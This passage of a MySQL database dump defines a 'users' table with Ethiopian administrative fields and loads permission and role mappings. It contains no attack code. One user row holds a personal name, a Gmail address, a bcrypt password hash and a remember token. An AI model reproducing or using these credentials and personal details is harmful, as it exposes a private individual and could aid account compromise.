  `firstname` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `lastname` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `institute` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `email` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `profession` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `school` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `grade` int DEFAULT NULL,
  `age` int DEFAULT NULL,
  `gender` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `phone` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `region` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `zone` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `woreda` int DEFAULT NULL,
  `kebele` int DEFAULT NULL,
  `email_verified_at` timestamp NULL DEFAULT NULL,
  `password` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `two_factor_secret` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `two_factor_recovery_codes` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `remember_token` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `current_team_id` bigint unsigned DEFAULT NULL,
  `profile_photo_path` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `users_email_unique` (`email`)
) ENGINE=InnoDB AUTO_INCREMENT=31 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (28,'Alemhulu','Awekelgne',NULL,'alemhulu@gmail.com',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'$2y$10$xyI2VrRiWxMDTqx437Hs7O9jaPiO5uww4ULG9RSVhU.cbVguud3ba',NULL,NULL,'DYYQ6WJLLzyJTTrnxAaBXtDeYiVsVC52hdMUvAqOzvec63d0syYpS5XBIPJu',NULL,NULL,'2021-03-19 17:33:13','2021-06-23 06:07:39');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users_permissions`
--

DROP TABLE IF EXISTS `users_permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `users_permissions` (
  `user_id` int unsigned NOT NULL,
  `permission_id` int unsigned NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users_permissions`
--

LOCK TABLES `users_permissions` WRITE;
/*!40000 ALTER TABLE `users_permissions` DISABLE KEYS */;
INSERT INTO `users_permissions` VALUES (7,29),(7,30),(7,31),(7,32),(7,33),(7,34),(7,35),(7,36),(29,53),(29,54),(29,55),(29,56),(29,57),(28,29),(28,30),(28,31),(28,32),(28,33),(30,43),(30,44),(30,45),(30,46),(30,47);
/*!40000 ALTER TABLE `users_permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users_roles`
--

DROP TABLE IF EXISTS `users_roles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `users_roles` (
  `user_id` int unsigned NOT NULL,
  `role_id` int unsigned NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users_roles`
--

LOCK TABLES `users_roles` WRITE;
/*!40000 ALTER TABLE `users_roles` DISABLE KEYS */;
INSERT INTO `users_roles` VALUES (7,1),(29,4),(28,1),(30,3);
/*!40000 ALTER TABLE `users_roles` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2022-09-13 13:40:00
